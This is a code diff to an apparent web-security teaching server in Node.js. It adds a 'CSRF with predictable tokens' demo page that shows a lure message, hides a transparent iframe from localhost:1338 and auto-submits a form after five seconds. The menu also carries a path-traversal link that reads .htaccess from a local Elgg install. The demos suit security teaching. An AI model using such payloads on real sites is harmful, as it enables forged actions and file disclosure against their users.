@@ -126,6 +126,14 @@ http.createServer(function (req, res) {
             });
             
             break;
+        case "/csrftoken":
+                var html = getCSRFWithPredictableTokenHtml();
+                    
+                    //Start creating response
+                    res.writeHead(200, {'Content-Type': 'text/html'});
+                    res.write(html);
+                    res.end();        
+            break;
         case "/writetofile":        
         var log = fs.createWriteStream('log.txt', {'flags': 'a'});    
         log.write("this is a message\n");
@@ -264,6 +272,7 @@ function getHomePageHtmlCode(){
     str += '</div>';
     str += '</a>';
 
+
     str += '<a href="http://localhost/elgg/mod/ads/views/default/showlinks.php?file=../../../../.htaccess" class="mylink">';
     str += '<div class="num">';
     str += '5';
@@ -287,6 +296,20 @@ function getHomePageHtmlCode(){
     str += 'Modifying the query parameter displays external file jquery.js';
     str += '</div>';
     str += '</a>';
+
+    str += '<a href="/csrftoken" class="mylink">';
+    str += '<div class="num">';
+    str += '7';
+    str += '</div>';    
+    str += '<div class="title">';
+    str += 'CSRF with predictable tokens';
+    str += '</div>';
+    str += '<div class="desc">';
+    str += 'Check here to see CSRF with predictable tokens';
+    str += '</div>';
+    str += '</a>';
+
+
 
     str += '</div>';
     str += '</body>    ';
@@ -383,3 +406,22 @@ return str;
 }
 
 
+function getCSRFWithPredictableTokenHtml(){
+
+var str = "";
+str += '<html>';
+str += '<head>';
+str += '</head>';
+str += '<body bgcolor="black" onload="setTimeout(\'document.events.submit();\',5000);">';
+str += '<center>';
+str += '<font color="white"><h1>Welcome to this Web Security Site !!!</h1>';
+str += '<h2>There is a surprise for you every 5 seconds</h2></font>';
+str += '</center>';
+
+str += '<iframe src="http://localhost:1338/csrfwithtok.html" style="position: relative;opacity: 0;"></iframe>';
+str += '</body>';
+str += '</html>';
+
+return str;
+
+}
